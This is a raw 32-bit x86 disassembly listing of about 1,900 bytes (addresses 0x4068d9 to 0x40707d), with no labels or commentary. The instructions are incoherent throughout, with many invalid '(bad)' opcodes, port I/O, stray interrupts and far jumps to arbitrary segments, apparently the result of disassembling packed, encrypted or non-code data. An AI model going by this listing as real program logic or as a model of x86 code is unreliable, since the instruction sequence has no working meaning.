  4068d9:	test   eax,0x4bf5ba3a
  4068de:	out    dx,al
  4068df:	jmp    0x8d14:0x94c3c125
  4068e6:	pop    edx
  4068e7:	xor    DWORD PTR [ecx+0x4e5edaf9],eax
  4068ed:	ret    
  4068ee:	sbb    al,0xd7
  4068f0:	xacquire xchg BYTE PTR [esi],dl
  4068f3:	xchg   edx,eax
  4068f4:	call   0x50d1c1b1
  4068f9:	cmp    esi,edx
  4068fb:	mov    bh,0xc
  4068fd:	cmp    al,BYTE PTR [edx]
  4068ff:	inc    ecx
  406900:	outs   dx,DWORD PTR ds:[esi]
  406901:	jg     0x40691c
  406903:	cdq    
  406904:	mov    ds:0x90705e1d,eax
  406909:	out    dx,eax
  40690a:	shl    eax,1
  40690c:	bound  edi,QWORD PTR [eax]
  40690e:	pushf  
  40690f:	xor    ebx,DWORD PTR [ecx-0x6b]
  406912:	sub    eax,0x1458d046
  406917:	mov    dl,0x55
  406919:	int3   
  40691a:	int    0xb7
  40691c:	loope  0x4068d9
  40691e:	leave  
  40691f:	and    eax,0x3cd0f605
  406924:	and    DWORD PTR [eax],0xffffffca
  406927:	mov    bh,0xfa
  406929:	xchg   edi,eax
  40692a:	mov    esp,0xea633c51
  40692f:	mov    bl,BYTE PTR [edx-0x4a]
  406932:	xor    al,0x1a
  406934:	sub    cl,bh
  406936:	mov    eax,ds:0xb9f2aa86
  40693b:	stc    
  40693c:	inc    ecx
  40693d:	cmp    eax,0xe434407f
  406942:	add    eax,0x54a76320
  406947:	lds    ebp,FWORD PTR [edx-0x68]
  40694a:	and    BYTE PTR [ecx+0x3d1a9b8e],bh
  406950:	push   ebx
  406951:	or     DWORD PTR [esp+ebp*2-0x23],0x28
  406956:	test   BYTE PTR ds:0x91f7f409,cl
  40695c:	fist   DWORD PTR [edi-0xb40a02c]
  406962:	and    cl,BYTE PTR [ebx-0x531bd6d6]
  406968:	imul   eax,esp,0x4d
  40696b:	mov    bh,0x9c
  40696d:	nop
  40696e:	pop    es
  40696f:	push   ss
  406970:	jae    0x406908
  406972:	ret    0xb9ce
  406975:	mov    bh,0x59
  406977:	nop    ecx
  40697a:	mov    cl,0x36
  40697c:	xor    eax,0xcc0586cf
  406981:	cmp    al,0xa
  406983:	xor    eax,0x85ca8277
  406988:	fidivr DWORD PTR [ebx+edx*4+0x7663625]
  40698f:	fucomip st,st(1)
  406991:	mov    bl,ch
  406993:	push   ecx
  406994:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406995:	fstp   QWORD PTR [esi-0x6bf6c505]
  40699b:	push   eax
  40699c:	xlat   BYTE PTR ds:[ebx]
  40699d:	je     0x4069d1
  40699f:	jo     0x406946
  4069a1:	outs   dx,BYTE PTR ds:[esi]
  4069a2:	mov    ds,WORD PTR [ebx-0x432997ae]
  4069a8:	pop    ebx
  4069a9:	sbb    ebx,DWORD PTR [esp+edi*8-0x125cb6f0]
  4069b0:	mov    dl,0x2a
  4069b2:	jnp    0x406964
  4069b4:	mov    DWORD PTR [ebx-0x6a32744c],edi
  4069ba:	adc    DWORD PTR gs:[ecx-0x36],0x56
  4069bf:	add    ecx,DWORD PTR [eax]
  4069c1:	int3   
  4069c2:	push   edi
  4069c3:	in     eax,dx
  4069c4:	je     0x4069cf
  4069c6:	add    al,0x94
  4069c8:	lds    ecx,FWORD PTR [eax+ebp*8-0x36]
  4069cc:	pop    ds
  4069cd:	adc    DWORD PTR [ebx],0x265f5aad
  4069d3:	jl     0x4069bf
  4069d5:	mov    BYTE PTR [esi],cl
  4069d7:	mov    ds:0x58b35002,al
  4069dc:	lahf   
  4069dd:	outs   dx,BYTE PTR ds:[esi]
  4069de:	or     edx,DWORD PTR [ebx-0x23be6389]
  4069e4:	and    al,0x98
  4069e6:	adc    DWORD PTR [eax+0x38b47a18],esp
  4069ec:	xlat   BYTE PTR ds:[ebx]
  4069ed:	out    dx,eax
  4069ee:	sub    edi,ecx
  4069f0:	cwde   
  4069f1:	shl    ebx,1
  4069f3:	dec    ecx
  4069f4:	ret    
  4069f5:	std    
  4069f6:	cdq    
  4069f7:	push   eax
  4069f8:	xchg   ecx,eax
  4069f9:	clc    
  4069fa:	and    eax,0x6bd043c8
  4069ff:	push   0x4b
  406a01:	iret   
  406a02:	xor    esi,DWORD PTR [ecx+edi*8+0x4b61b8c6]
  406a09:	packuswb mm0,mm0
  406a0c:	js     0x406a1e
  406a0e:	pusha  
  406a0f:	int    0x89
  406a11:	retf   0x1df0
  406a14:	nop
  406a15:	mov    al,ds:0xe24a1e72
  406a1a:	leave  
  406a1b:	mov    al,0xaf
  406a1d:	pop    edx
  406a1e:	or     ah,cl
  406a20:	or     eax,0xf2707d26
  406a25:	aad    0x9e
  406a27:	jnp    0x406a40
  406a29:	mov    ds:0x4a5fd570,al
  406a2e:	popf   
  406a2f:	ret    0x96f5
  406a32:	add    ah,BYTE PTR [edx-0x2452620d]
  406a38:	ja     0x4069c9
  406a3a:	sbb    BYTE PTR ds:0xfccf003a,bh
  406a40:	call   0x235be2f7
  406a45:	fsubr  QWORD PTR [ebx+0x30]
  406a48:	add    dh,bh
  406a4a:	xor    DWORD PTR [eax+0x2d],esi
  406a4d:	add    DWORD PTR [edx],esi
  406a4f:	adc    BYTE PTR [ebp-0x7f],dl
  406a52:	add    DWORD PTR [eax],esi
  406a54:	mov    DWORD PTR [eax],ebp
  406a56:	mov    DWORD PTR [ebp+0xe],ebx
  406a59:	ja     0x406a6c
  406a5b:	pop    ss
  406a5c:	inc    esp
  406a5d:	sub    cl,al
  406a5f:	dec    ecx
  406a60:	mov    dh,0xc0
  406a62:	jo     0x406adb
  406a64:	inc    ebp
  406a65:	lock jne 0x406a0f
  406a68:	cmc    
  406a69:	stos   BYTE PTR es:[edi],al
  406a6a:	aas    
  406a6b:	les    ebp,FWORD PTR [ecx-0x4dbca5b]
  406a71:	loopne 0x406a73
  406a73:	mov    WORD PTR [ecx],ds
  406a75:	mov    edx,DWORD PTR [ebx]
  406a77:	arpl   WORD PTR [ecx+ebp*4+0x4e],bx
  406a7b:	xchg   ebx,eax
  406a7c:	nop
  406a7d:	(bad)  
  406a7e:	(bad)  
  406a7f:	mov    dh,0x3b
  406a81:	jge    0x406ae7
  406a83:	fs xor al,0xe9
  406a86:	push   es
  406a87:	outs   dx,BYTE PTR ds:[esi]
  406a88:	call   0x992e:0xaae46b48
  406a8f:	push   esi
  406a90:	jle    0x406a78
  406a92:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406a93:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406a94:	in     eax,dx
  406a95:	push   ecx
  406a96:	push   eax
  406a97:	xor    eax,0x30ec595a
  406a9c:	fisub  DWORD PTR [edx]
  406a9e:	mov    ds:0x9fb19e1f,al
  406aa3:	addr16 dec ecx
  406aa5:	ins    BYTE PTR es:[edi],dx
  406aa6:	daa    
  406aa7:	enter  0x5f5,0x89
  406aab:	adc    eax,0x4b6b6399
  406ab0:	xor    BYTE PTR [esi+0x44],0xfc
  406ab4:	icebp  
  406ab5:	pop    ebx
  406ab6:	(bad)  
  406ab7:	pop    edx
  406ab8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406ab9:	xchg   ecx,eax
  406aba:	mov    esp,0x7a0297e4
  406abf:	mov    BYTE PTR [ebx+0x3760770f],dh
  406ac5:	stc    
  406ac6:	outs   dx,DWORD PTR ds:[esi]
  406ac7:	mov    cl,0x13
  406ac9:	gs pop ebx
  406acb:	pop    esi
  406acc:	nop
  406acd:	pop    edx
  406ace:	ficomp DWORD PTR [edx]
  406ad0:	aam    0x99
  406ad2:	or     DWORD PTR [eax+0x9d1e5e2],0xffffffc3
  406ad9:	and    dh,ah
  406adb:	lahf   
  406adc:	xchg   edi,eax
  406add:	dec    edx
  406ade:	sub    eax,0x68470895
  406ae3:	and    ebp,esp
  406ae5:	test   eax,0xba20569a
  406aea:	mov    edx,DWORD PTR [edi+ecx*4-0x21a2d252]
  406af1:	or     eax,0xe2ddda6a
  406af6:	loop   0x406b6e
  406af8:	mov    bl,0x88
  406afa:	clc    
  406afb:	sbb    BYTE PTR [edi+0x2d],0x62
  406aff:	xlat   BYTE PTR ds:[ebx]
  406b00:	fcomp  DWORD PTR ds:0x5a242bba
  406b06:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406b07:	or     cl,ah
  406b09:	and    al,0x48
  406b0b:	rcl    DWORD PTR [ebx-0x660a82c0],1
  406b11:	and    edi,DWORD PTR ds:0xdeea0c9
  406b17:	pop    ebp
  406b18:	nop
  406b19:	int3   
  406b1a:	lods   eax,DWORD PTR ds:[esi]
  406b1b:	(bad)  
  406b1c:	jmp    0x1f141cb6
  406b21:	je     0x406b18
  406b23:	and    DWORD PTR ds:0x2fc485c0,eax
  406b29:	lea    ebx,[ebp+0x2707ead9]
  406b2f:	and    DWORD PTR [edi],eax
  406b31:	sub    al,0x8b
  406b33:	mov    al,0x2c
  406b35:	mov    ah,BYTE PTR [edi]
  406b37:	hlt    
  406b38:	sbb    al,0xb
  406b3a:	xor    al,0x49
  406b3c:	sahf   
  406b3d:	loop   0x406ad4
  406b3f:	fidivr DWORD PTR [eax-0x5]
  406b42:	xor    ebp,DWORD PTR [ecx+0x56ccce12]
  406b48:	mov    ds,WORD PTR [ebx+0x52ae23bc]
  406b4e:	aas    
  406b4f:	inc    ebp
  406b50:	imul   ecx,DWORD PTR [ecx+eax*8+0x2368e2f],0xde9b0097
  406b5b:	enter  0xa376,0x2a
  406b5f:	imul   ebx,DWORD PTR ds:0x334d5ba1,0x8151a29f
  406b69:	(bad)  
  406b6b:	jnp    0x406bcf
  406b6d:	mov    bl,0x48
  406b6f:	mov    ch,0xa
  406b71:	pusha  
  406b72:	sub    ah,BYTE PTR [ecx+eax*1]
  406b75:	enter  0x7896,0x43
  406b79:	or     bl,BYTE PTR gs:[ecx+0x78]
  406b7d:	adc    al,0x57
  406b7f:	lds    cx,DWORD PTR [ecx+0x12179c99]
  406b86:	mov    ebx,0xfb8ed2b9
  406b8b:	(bad)  
  406b8c:	push   cs
  406b8d:	mov    edi,0x553f7e82
  406b92:	ds or  BYTE PTR ss:[ebp+0x71],0x71
  406b98:	stc    
  406b99:	push   eax
  406b9a:	rcr    BYTE PTR [bx+si],1
  406b9d:	push   es
  406b9e:	cmc    
  406b9f:	mov    cl,0x8f
  406ba1:	out    0x6d,eax
  406ba3:	mov    ch,0xe8
  406ba5:	xchg   edx,eax
  406ba6:	into   
  406ba7:	inc    edx
  406ba8:	pop    eax
  406ba9:	mov    ebp,DWORD PTR [ecx+0x49]
  406bac:	cmp    al,0x63
  406bae:	xor    eax,0x38034a00
  406bb3:	popf   
  406bb4:	sbb    cl,dh
  406bb6:	es retf 
  406bb8:	push   edx
  406bb9:	ror    BYTE PTR [ecx-0x20],cl
  406bbc:	push   ebx
  406bbd:	ret    0xe1a8
  406bc0:	loope  0x406c38
  406bc2:	mul    DWORD PTR [ecx]
  406bc4:	popa   
  406bc5:	int    0xc6
  406bc7:	and    DWORD PTR ds:[eax],eax
  406bca:	dec    ecx
  406bcb:	leave  
  406bcc:	xchg   ecx,eax
  406bcd:	dec    dh
  406bcf:	jo     0x406b9e
  406bd1:	dec    DWORD PTR [esi+0x76a85477]
  406bd7:	push   ebx
  406bd8:	or     esi,DWORD PTR [edi-0x7f20aaef]
  406bde:	push   ebp
  406bdf:	in     eax,dx
  406be0:	jno    0x406bef
  406be2:	(bad)  
  406be3:	and    DWORD PTR es:[ebx+0x37],0xffffffaf
  406be8:	xchg   BYTE PTR [edi],ch
  406bea:	push   esp
  406bec:	and    BYTE PTR [edi-0x30d2607],0xfc
  406bf3:	loopne 0x406c04
  406bf5:	sbb    al,0x18
  406bf7:	loop   0x406bcb
  406bf9:	jno    0x406b93
  406bfb:	(bad)  
  406bfd:	xchg   ebp,eax
  406bfe:	stos   DWORD PTR es:[edi],eax
  406bff:	sub    BYTE PTR ds:0x9f19ae4f,ch
  406c05:	cmp    ecx,DWORD PTR ds:0x531da063
  406c0b:	push   esi
  406c0c:	or     esi,esp
  406c0e:	pop    eax
  406c0f:	adc    BYTE PTR [edi-0x13],al
  406c12:	sbb    bl,BYTE PTR [ecx-0x3e]
  406c15:	aaa    
  406c16:	and    BYTE PTR [ebp-0x5c22017f],al
  406c1c:	and    BYTE PTR [edx],bl
  406c1e:	sahf   
  406c1f:	push   edx
  406c20:	jb     0x406c1a
  406c22:	inc    esp
  406c23:	lods   al,BYTE PTR ds:[esi]
  406c24:	add    bh,ch
  406c26:	lods   eax,DWORD PTR ds:[esi]
  406c27:	repnz and BYTE PTR [edi-0x78],dh
  406c2b:	ret    
  406c2c:	ins    DWORD PTR es:[edi],dx
  406c2d:	ret    0x3b16
  406c30:	pop    ecx
  406c31:	imul   esp,DWORD PTR [ebx+0x65],0xbb1e93e6
  406c38:	and    DWORD PTR [edx+0x400543d3],eax
  406c3e:	call   0xce66:0xa4e328df
  406c45:	cwde   
  406c46:	test   ah,0xa7
  406c49:	addr16 mov eax,0xe9197859
  406c4f:	jae    0x406cb5
  406c51:	pop    ss
  406c52:	mov    bl,0x1c
  406c54:	out    0x9b,al
  406c56:	aas    
  406c57:	mov    ah,0x85
  406c59:	pop    esp
  406c5a:	sub    al,0x53
  406c5c:	out    dx,eax
  406c5d:	pop    esi
  406c5e:	xor    DWORD PTR [eax-0x3],edi
  406c61:	test   DWORD PTR fs:[ecx+0x1085fbc1],edi
  406c68:	xlat   BYTE PTR ds:[ebx]
  406c69:	in     eax,dx
  406c6a:	rcl    DWORD PTR [ebx+0x5e3a0ab],1
  406c70:	addr16 int 0x7
  406c73:	mov    esp,0xdcc2474a
  406c78:	xor    ch,BYTE PTR [edi+0x3e]
  406c7b:	push   es
  406c7c:	ss cdq 
  406c7e:	dec    edx
  406c7f:	sar    edi,0x4c
  406c82:	xor    eax,0x37345618
  406c87:	sbb    dl,BYTE PTR [eax-0x1d]
  406c8a:	outs   dx,DWORD PTR ds:[esi]
  406c8b:	es je  0x406c10
  406c8e:	imul   ebx,DWORD PTR [ecx],0x692e52cc
  406c94:	mov    ch,0xfa
  406c96:	fild   WORD PTR [esi+0x572270b]
  406c9c:	xlat   BYTE PTR ds:[ebx]
  406c9d:	pop    ecx
  406c9e:	push   ebp
  406c9f:	dec    BYTE PTR cs:[esi-0x37]
  406ca3:	es repnz test al,0x13
  406ca7:	mov    BYTE PTR [esi-0x39],bh
  406caa:	jnp    0x406c72
  406cac:	sub    eax,0x26a2c181
  406cb1:	pop    edi
  406cb2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406cb3:	push   ebp
  406cb4:	xchg   DWORD PTR [esi+0x51678593],edx
  406cba:	vpshlq ymm6,xmm3,[edx+0x61]
  406cc0:	fcomp  st(7)
  406cc2:	dec    ecx
  406cc3:	fwait
  406cc4:	lods   eax,DWORD PTR ds:[esi]
  406cc5:	aad    0xb1
  406cc7:	cld    
  406cc8:	and    eax,0xe75f5026
  406ccd:	adc    DWORD PTR [esi+eax*4],esi
  406cd0:	mov    bh,0x83
  406cd2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406cd3:	test   BYTE PTR [edi],al
  406cd5:	sub    eax,0xd1961333
  406cda:	aad    0x60
  406cdc:	test   al,0xfd
  406cde:	(bad)  
  406cdf:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406ce1:	fist   WORD PTR [ebp+0x22]
  406ce4:	(bad)  
  406ce5:	push   0x251e6c11
  406cea:	jmp    0x6af7:0xb29206a9
  406cf1:	mov    ch,0xe6
  406cf3:	sub    esp,DWORD PTR [edx-0x43da7af9]
  406cf9:	sahf   
  406cfa:	pusha  
  406cfb:	and    al,0x80
  406cfd:	scas   al,BYTE PTR es:[edi]
  406cfe:	test   DWORD PTR [edi+eiz*8+0x2960e13],esp
  406d05:	test   al,0x40
  406d07:	icebp  
  406d08:	outs   dx,BYTE PTR ds:[esi]
  406d09:	out    dx,eax
  406d0a:	inc    ebx
  406d0b:	cmp    DWORD PTR [ebx-0x6a1e8f23],edi
  406d11:	jecxz  0x406cfc
  406d13:	sbb    edi,edi
  406d15:	fwait
  406d16:	and    al,0x62
  406d18:	outs   dx,BYTE PTR ds:[esi]
  406d19:	loope  0x406d1c
  406d1b:	push   0x1f647e25
  406d20:	out    0x32,al
  406d22:	retf   
  406d23:	mov    bl,0xeb
  406d25:	cmp    al,0xd
  406d27:	in     eax,0x3
  406d29:	ins    BYTE PTR es:[edi],dx
  406d2a:	les    esp,FWORD PTR fs:[eax+0x3c]
  406d2e:	jl     0x406d61
  406d30:	cmp    DWORD PTR [eax+0x3e],ebp
  406d33:	std    
  406d34:	and    esi,edx
  406d36:	xchg   esi,eax
  406d37:	dec    esp
  406d38:	sbb    DWORD PTR [edi-0x165d5d90],esp
  406d3e:	(bad)  
  406d3f:	cld    
  406d40:	test   al,0x8e
  406d42:	stc    
  406d43:	jb     0x406d6d
  406d45:	cli    
  406d46:	arpl   WORD PTR [esi*1-0x5050bfe1],cx
  406d4d:	pop    edx
  406d4e:	fistp  QWORD PTR [edi-0x7]
  406d51:	xchg   ebp,eax
  406d52:	xchg   dh,bh
  406d54:	xor    DWORD PTR [edx-0x5822d773],esp
  406d5a:	fs ja  0x406da8
  406d5d:	mov    dh,0xf3
  406d5f:	push   cs
  406d60:	popa   
  406d61:	stc    
  406d62:	loope  0x406d24
  406d64:	mov    WORD PTR [eax],ss
  406d66:	lahf   
  406d67:	xor    edi,DWORD PTR [edi]
  406d69:	arpl   WORD PTR [esi+0x73],bp
  406d6c:	dec    ebp
  406d6d:	or     DWORD PTR [ebx+0x45],0x571eb658
  406d74:	ja     0x406dce
  406d76:	or     edi,ebx
  406d78:	mul    ch
  406d7a:	pop    ebx
  406d7b:	jne    0x406d82
  406d7d:	or     edx,DWORD PTR [ebp+0x66]
  406d80:	pop    ds
  406d81:	inc    ebx
  406d82:	and    BYTE PTR [edi-0x4b03d266],0x7f
  406d89:	mov    ah,0xc5
  406d8b:	sbb    al,0xc3
  406d8d:	pop    edx
  406d8e:	jmp    0xe6b8:0x1a6d6f0
  406d95:	pusha  
  406d96:	pop    eax
  406d97:	fcomp  QWORD PTR [ebp+0x3d]
  406d9a:	mov    esi,0xe3522c99
  406d9f:	jle    0x406ddd
  406da1:	imul   ecx,DWORD PTR fs:[edx-0x58],0x5f
  406da6:	fdivp  st(4),st
  406da8:	stos   DWORD PTR es:[edi],eax
  406da9:	imul   ebp,DWORD PTR [edi],0x5dcfd7c
  406daf:	out    dx,eax
  406db0:	add    ah,bh
  406db2:	aad    0xae
  406db4:	mov    ds:0xb048614d,al
  406db9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406dba:	fwait
  406dbb:	xor    BYTE PTR ds:0x1d34db18,ah
  406dc1:	pushf  
  406dc2:	sub    bl,BYTE PTR [esi-0x6f8dbc4f]
  406dc8:	mov    bh,0x9b
  406dca:	cmp    eax,ebp
  406dcc:	imul   ecx,DWORD PTR [edi],0xb64244b5
  406dd2:	test   eax,0xbcb61b33
  406dd7:	xchg   esp,eax
  406dd8:	push   es
  406dd9:	push   es
  406dda:	adc    BYTE PTR [edi-0x10801b49],ah
  406de0:	dec    ecx
  406de1:	cmp    BYTE PTR ds:0x777ad027,dh
  406de7:	cli    
  406de8:	dec    ebx
  406de9:	xchg   esi,eax
  406dea:	adc    esi,ebp
  406dec:	ret    
  406ded:	cmc    
  406dee:	fwait
  406def:	aam    0x35
  406df1:	(bad)  
  406df2:	cdq    
  406df3:	ins    BYTE PTR es:[edi],dx
  406df4:	and    ebp,DWORD PTR [edx+0x16]
  406df7:	scas   al,BYTE PTR es:[edi]
  406df8:	ins    DWORD PTR es:[edi],dx
  406df9:	xchg   edi,eax
  406dfa:	jg     0x406e44
  406dfc:	mov    ecx,0x55aa406f
  406e01:	pop    ebx
  406e02:	jecxz  0x406e2c
  406e04:	pop    esi
  406e05:	imul   ebx,esp,0xffffff90
  406e08:	iret   
  406e09:	add    ecx,DWORD PTR [eax+0x76]
  406e0c:	adc    DWORD PTR [ecx],edx
  406e0e:	mov    DWORD PTR ds:0xebdba60a,ecx
  406e14:	repz ds (bad) 
  406e17:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406e18:	dec    edx
  406e19:	mov    WORD PTR [eax+0x562eda1d],ds
  406e1f:	dec    ebp
  406e20:	mov    dl,0x7c
  406e22:	es push 0x3cf012e1
  406e28:	or     BYTE PTR [edx],dh
  406e2a:	mov    ebx,0x1d73ac55
  406e2f:	cmp    eax,0x2ed033cf
  406e34:	dec    edx
  406e35:	xor    al,0xe1
  406e37:	push   ecx
  406e38:	call   0x97fd:0xc0e8e413
  406e3f:	ror    DWORD PTR [ecx],0x52
  406e42:	outs   dx,BYTE PTR ds:[esi]
  406e43:	push   ebp
  406e44:	push   cs
  406e45:	std    
  406e46:	fwait
  406e47:	mov    ebp,0xd4bc6b99
  406e4c:	add    dh,al
  406e4e:	(bad)  
  406e50:	shld   edi,esi,0x44
  406e54:	cmc    
  406e55:	adc    ecx,esp
  406e57:	push   eax
  406e58:	pop    eax
  406e59:	lss    esi,FWORD PTR [edi]
  406e5c:	(bad)  
  406e5d:	dec    ebx
  406e5e:	mov    cl,0x57
  406e60:	adc    al,ch
  406e62:	inc    BYTE PTR [ecx]
  406e64:	cmp    dh,al
  406e66:	adc    eax,0xd49577ab
  406e6b:	jbe    0x406e86
  406e6d:	stos   BYTE PTR es:[edi],al
  406e6e:	add    bh,BYTE PTR [edi+0x3f80b52b]
  406e74:	rol    DWORD PTR [ecx-0x312f56e8],0x50
  406e7b:	fidivr WORD PTR [ecx+0x710f6ef]
  406e81:	scas   eax,DWORD PTR es:[edi]
  406e82:	push   eax
  406e83:	cmp    eax,DWORD PTR [edx+0x2c]
  406e86:	mov    cl,0x8f
  406e88:	mul    BYTE PTR [ecx]
  406e8a:	inc    edx
  406e8b:	(bad)  
  406e8c:	hlt    
  406e8d:	pop    edi
  406e8e:	pop    ebp
  406e8f:	in     al,0xe1
  406e91:	pop    esp
  406e92:	cmp    BYTE PTR [ecx],bh
  406e94:	data16 addr16 jg 0x406eb0
  406e98:	scas   al,BYTE PTR es:[edi]
  406e99:	cdq    
  406e9a:	mov    dl,BYTE PTR [ecx]
  406e9c:	xchg   edx,eax
  406e9d:	cwde   
  406e9e:	sbb    BYTE PTR [edi+0x397aaf9a],dh
  406ea4:	sbb    ecx,DWORD PTR [ebx-0x4d32299f]
  406eaa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406eab:	cmc    
  406eac:	jl     0x406e93
  406eae:	xchg   DWORD PTR [eax+0x4f870368],ecx
  406eb4:	daa    
  406eb5:	fst    QWORD PTR [ecx]
  406eb7:	fwait
  406eb8:	test   DWORD PTR [ecx],0xe228a24a
  406ebe:	aam    0xe0
  406ec0:	mov    DWORD PTR [esp+eiz*4+0x79c8f444],ebx
  406ec7:	lock aas 
  406ec9:	sbb    cl,BYTE PTR [esi]
  406ecb:	out    0x67,eax
  406ecd:	or     eax,DWORD PTR [ebx+0x7b]
  406ed0:	pop    esi
  406ed1:	xchg   ebp,ebp
  406ed3:	sub    eax,DWORD PTR [ecx]
  406ed5:	loop   0x406e62
  406ed7:	push   esp
  406ed8:	pop    esi
  406ed9:	dec    esi
  406eda:	aam    0x6c
  406edc:	fs jle 0x406e9e
  406edf:	add    BYTE PTR [ecx-0x61e660eb],ah
  406ee5:	fisubr WORD PTR [ebp+edi*2-0x3e]
  406ee9:	stc    
  406eea:	or     eax,0xae682981
  406eef:	gs cdq 
  406ef1:	or     eax,ebx
  406ef3:	repnz lock retf 0x9c67
  406ef8:	fnstcw WORD PTR [eax+0x257d854a]
  406efe:	dec    edx
  406eff:	xor    BYTE PTR [eax],0x25
  406f02:	cmp    ebx,edi
  406f04:	mov    ebp,0x7bc6590c
  406f09:	add    al,0x38
  406f0b:	mov    ch,BYTE PTR [eax]
  406f0d:	arpl   cx,bp
  406f0f:	je     0x406e99
  406f11:	mov    dl,0x9c
  406f13:	cmp    BYTE PTR [esi+eiz*1-0x78],dh
  406f17:	shl    edx,cl
  406f19:	sbb    eax,DWORD PTR [eax-0x6]
  406f1c:	sub    edi,DWORD PTR [esi]
  406f1e:	xor    al,0x44
  406f20:	std    
  406f21:	xor    BYTE PTR [edi-0x38],0x1b
  406f25:	iret   
  406f26:	pushf  
  406f27:	imul   ebp,DWORD PTR [ecx+0xf8766bd],0xd5d8a37
  406f31:	clc    
  406f32:	xor    dh,BYTE PTR [edi]
  406f34:	adc    BYTE PTR [edi-0xd97fcc6],cl
  406f3a:	xlat   BYTE PTR ds:[ebx]
  406f3b:	dec    edi
  406f3c:	addr16 sahf 
  406f3e:	ret    0x7d41
  406f41:	loope  0x406eef
  406f43:	aas    
  406f44:	push   esp
  406f45:	sub    BYTE PTR [ebx+0x4a0035f2],dl
  406f4b:	sub    eax,0x6a995ccb
  406f50:	cmp    dh,cl
  406f52:	mov    esp,0xacea4386
  406f57:	clc    
  406f58:	mov    bh,0xa1
  406f5a:	add    BYTE PTR [ebx+esi*1],dh
  406f5d:	dec    edi
  406f5e:	shr    ah,1
  406f60:	jle    0x406ee7
  406f62:	es fs imul esi,esp,0xc8dc3ab
  406f6a:	das    
  406f6b:	and    eax,0xff988c03
  406f70:	in     eax,0x5c
  406f72:	mov    ecx,0x53d33649
  406f77:	pop    ds
  406f78:	(bad)  
  406f79:	sub    dl,BYTE PTR [ebp+0x33]
  406f7c:	jns    0x406f0a
  406f7e:	xor    al,0x57
  406f80:	xchg   edi,eax
  406f81:	rol    DWORD PTR ds:0x8f296c7a,0xa1
  406f88:	shl    DWORD PTR [esi],0xeb
  406f8b:	add    bh,BYTE PTR [ebx+0x374a66dc]
  406f91:	enter  0xd81d,0x98
  406f95:	sub    eax,0x3b79eb26
  406f9a:	jmp    0x406fab
  406f9c:	fisub  DWORD PTR [eax]
  406f9e:	in     al,0xa7
  406fa0:	lods   al,BYTE PTR ds:[esi]
  406fa1:	jne    0x406fa5
  406fa3:	ja     0x406fa4
  406fa5:	outs   dx,BYTE PTR ds:[esi]
  406fa6:	jmp    0x406f61
  406fa8:	sbb    DWORD PTR [edi-0x3],ebp
  406fab:	icebp  
  406fac:	mov    ch,0xdf
  406fae:	or     DWORD PTR [edi+0x273f194d],ebp
  406fb4:	inc    edi
  406fb5:	mov    esi,0x3f712226
  406fba:	cmp    al,0xff
  406fbc:	mov    DWORD PTR [ebp+0x1],esp
  406fbf:	or     ch,BYTE PTR [ebx]
  406fc1:	mov    BYTE PTR [esi+0x67],dl
  406fc4:	push   0x2f
  406fc6:	adc    BYTE PTR [esi+0x4994119f],cl
  406fcc:	lods   eax,DWORD PTR ds:[esi]
  406fcd:	ror    DWORD PTR [esi-0x3c6405d4],1
  406fd3:	in     eax,dx
  406fd4:	out    dx,eax
  406fd5:	xor    al,0x84
  406fd7:	ins    DWORD PTR es:[edi],dx
  406fd8:	test   DWORD PTR [ebp+ebp*2-0xa82bbed],ebx
  406fdf:	int3   
  406fe0:	inc    edx
  406fe1:	push   esi
  406fe2:	rep ins DWORD PTR es:[edi],dx
  406fe4:	xchg   ebp,eax
  406fe5:	sbb    al,0x19
  406fe7:	lods   eax,DWORD PTR ds:[esi]
  406fe8:	adc    eax,0x70194c1d
  406fed:	sub    ebp,DWORD PTR [eax-0x1b]
  406ff0:	adc    eax,0xeaf1f77c
  406ff5:	(bad)  
  406ff6:	outs   dx,DWORD PTR ds:[esi]
  406ff7:	loopne 0x406f7c
  406ff9:	sahf   
  406ffa:	cld    
  406ffb:	inc    eax
  406ffc:	mov    dh,0xf6
  406ffe:	jmp    0xe0ed2274
  407003:	push   ebp
  407004:	and    BYTE PTR [ecx-0x25],ah
  407007:	hlt    
  407008:	lahf   
  407009:	mov    cl,0x2
  40700b:	call   0xff3c:0xa6df1267
  407012:	or     DWORD PTR [esi],ebp
  407014:	inc    ebp
  407015:	and    ebp,DWORD PTR [esi+ebp*1]
  407018:	mov    es,WORD PTR [edi+ebx*8]
  40701b:	cmp    al,0x96
  40701d:	pop    edx
  40701e:	jbe    0x407030
  407020:	jl     0x406fd2
  407022:	repnz push eax
  407024:	ja     0x406ff8
  407026:	ins    BYTE PTR es:[edi],dx
  407027:	push   ebx
  407028:	fiadd  WORD PTR [eax+0xb]
  40702b:	fnsave [edi]
  40702d:	repnz ss or eax,0xbc0666e9
  407034:	retf   
  407035:	mov    cl,0x5b
  407037:	inc    ebx
  407038:	push   ebp
  407039:	lds    ebx,FWORD PTR [edi]
  40703b:	add    ah,BYTE PTR [ecx-0x2c]
  40703e:	jp     0x407000
  407040:	xchg   edi,eax
  407041:	pop    esi
  407042:	in     al,0x1f
  407044:	sbb    DWORD PTR [ebx-0x4f805ad7],ebx
  40704a:	xchg   edx,eax
  40704b:	ret    0x485e
  40704e:	scas   eax,DWORD PTR es:[edi]
  40704f:	xlat   BYTE PTR ds:[ebx]
  407050:	aad    0xa8
  407052:	sbb    al,BYTE PTR [eax-0x67]
  407055:	call   0x1db0:0xeed4727a
  40705c:	(bad)  
  40705d:	or     ah,BYTE PTR [ebp-0x6c]
  407060:	push   ds
  407061:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407062:	(bad)  
  407063:	fldenv [ebp+0x15603607]
  407069:	xchg   ecx,eax
  40706a:	rcl    DWORD PTR [edi-0x36],1
  40706d:	add    BYTE PTR [ecx],cl
  40706f:	cli    
  407070:	outs   dx,DWORD PTR ds:[esi]
  407071:	sbb    eax,DWORD PTR [edx+0x32529602]
  407077:	enter  0x1a62,0xe5
  40707b:	ret    
  40707c:	pop    edx
  40707d:	cli    
